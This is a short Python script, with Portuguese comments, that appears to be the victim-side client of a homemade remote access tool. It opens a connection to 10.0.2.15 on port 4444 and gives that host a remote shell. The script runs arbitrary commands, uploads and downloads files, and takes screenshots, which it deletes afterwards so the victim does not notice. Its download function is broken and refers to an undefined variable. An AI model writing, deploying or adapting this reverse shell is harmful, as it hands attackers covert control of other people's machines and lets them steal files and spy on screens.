#Servidor atacado
import socket 
import json 
import os 
import subprocess
import pyautogui 

#Enviar os dados
def data_send(data):
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())

#Conexão
def data_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

#Fazer o upload de arquivos
def upload_file(file):
    f = open(file, 'rb')
    soc.send(f.read())

#Fazer download de arquivos
def download_file(file):
        f = open(file, 'wb')
        soc.settimeout(5)
        soc = soc.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = soc.recv(1024)
            except socket.timeout as e:
                break
        soc.settimeout(None)
        f.close()

#Fazer o screenshot
def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save('screen.png')


#Comandos após acessar a máquina atacada
def shell():
    while True:
        command = data_recv()
        if command == 'exit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png') #Salvar o screenshot
            os.remove('screen.png') #Vítima não descobrir o screenshot
        elif command == 'help':
            pass
        else:
            exe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #Tratamento de erro
            rcomm = exe.stdout.read() + exe.stderr.read()
            rcomm = rcomm.decode()
            data_send(rcomm)
        
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect(('10.0.2.15', 4444))
shell()
